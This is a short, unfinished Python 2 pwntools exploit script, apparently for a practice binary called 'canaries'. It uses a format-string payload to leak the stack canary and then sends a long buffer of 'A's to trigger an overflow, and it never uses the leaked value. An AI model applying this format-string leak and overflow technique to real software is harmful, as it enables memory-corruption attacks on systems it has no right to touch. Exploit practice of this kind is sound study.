#!/usr/bin/env python

from pwn import *
import sys, struct

def exploit():
	p = process(['./canaries'])
	print util.proc.pidof(p) 
	#sys.stdin.read(1)

	#print p.recv()
	p.sendline("AAAA" + "%129$x." + "%1$x")
	leak = p.recv()
	canary = leak[4:12]
	print "Canary: "+ canary
	print "Test: "+ leak[13:22]
	
	p.recv()
	p.recv()
	p.sendline("A"*500)
	p.recv()
	p.recv()
'''
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
	p.recv()
'''
if __name__ == "__main__":
	try:
		exploit()
	except:
		print "[-] Unable to run exploit."